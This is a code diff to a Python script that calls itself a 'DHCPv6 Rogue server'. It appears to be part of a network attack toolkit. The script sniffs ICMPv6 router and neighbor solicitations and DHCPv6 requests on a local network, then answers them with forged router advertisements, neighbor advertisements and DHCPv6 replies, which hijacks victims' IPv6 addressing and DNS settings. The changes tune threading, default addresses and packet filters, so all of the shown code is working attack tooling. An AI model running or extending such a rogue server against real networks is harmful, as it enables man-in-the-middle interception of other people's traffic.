@@ -27,7 +27,7 @@ Base = Base()
 Base.check_user()
 Base.check_platform()
 
-tm = ThreadManager(3)
+tm = ThreadManager(5)
 
 parser = ArgumentParser(description='DHCPv6 Rogue server')
 
@@ -74,11 +74,12 @@ dns_search = args.dns_search
 if args.target_mac is not None:
     target_mac_address = str(args.target_mac).lower()
 
+ipv6_address = None
 if args.global_ipv6 is not None:
     target_ip_address = args.global_ipv6
     ipv6_address = args.global_ipv6
 else:
-    ipv6_address = "fd00::34e"
+    ipv6_address = "fd00::1111"
 
 your_mac_address = Base.get_netiface_mac_address(current_network_interface)
 if your_mac_address is None:
@@ -177,6 +178,8 @@ def send_icmpv6_advertise_packets():
                 SOCK.send(icmpv6_ra_packet)
                 sleep(0.1)
 
+    SOCK.close()
+
 
 def reply(request):
     global global_socket
@@ -211,7 +214,7 @@ def reply(request):
     # ICMPv6 Neighbor Solicitation
     if request.haslayer(ICMPv6ND_NS):
         # pass
-        if request[ICMPv6ND_NS].tgt != ipv6_address or need_neighbor_advertise:
+        if request[ICMPv6ND_NS].tgt != ipv6_address:
             if request[ICMPv6ND_NS].tgt is not None:
                 icmpv6_na_packet = icmpv6.make_neighbor_advertisement_packet(ethernet_src_mac=your_mac_address,
                                                                              ipv6_src=your_ipv6_link_address,
@@ -248,7 +251,8 @@ def reply(request):
         if request.haslayer(DHCP6_Request):
             print Base.c_info + "Sniff DHCPv6 Request from: " + request[IPv6].src + " (" + \
                   request[Ether].src + ") TID: " + hex(request[DHCP6_Request].trid) + \
-                  " Server MAC: " + request[DHCP6OptServerId].duid.lladdr + " IAADDR: " + request[DHCP6OptIAAddress].addr
+                  " Server MAC: " + request[DHCP6OptServerId].duid.lladdr + " IAADDR: " + \
+                  request[DHCP6OptIAAddress].addr
             # print request.summary
             if request[DHCP6OptServerId].duid.lladdr != your_mac_address:
                 need_neighbor_advertise = True
@@ -312,11 +316,15 @@ if __name__ == "__main__":
 
     if args.target_mac is None:
         print Base.c_info + "Waiting for a ICMPv6 RS or DHCPv6 requests ..."
-        sniff(lfilter=lambda d: d.src != your_mac_address,
-              filter="icmp6 or (udp and src port 546 and dst port 547)",
+        sniff(lfilter=lambda d: d.src != your_mac_address and (ICMPv6ND_RS in d or ICMPv6ND_NS in d
+                                                               or DHCP6_Solicit in d or DHCP6_Request in d
+                                                               or DHCP6_Release in d or DHCP6_Confirm in d
+                                                               or DHCP6_Decline in d),
               prn=reply, iface=current_network_interface)
     else:
         print Base.c_info + "Waiting for a ICMPv6 RS, NS or DHCPv6 requests from: " + args.target_mac + " ..."
-        sniff(lfilter=lambda d: d.src == args.target_mac,
-              filter="icmp6 or (udp and src port 546 and dst port 547)",
+        sniff(lfilter=lambda d: d.src == args.target_mac and (ICMPv6ND_RS in d or ICMPv6ND_NS in d
+                                                              or DHCP6_Solicit in d or DHCP6_Request in d
+                                                              or DHCP6_Release in d or DHCP6_Confirm in d
+                                                              or DHCP6_Decline in d),
               prn=reply, iface=current_network_interface)
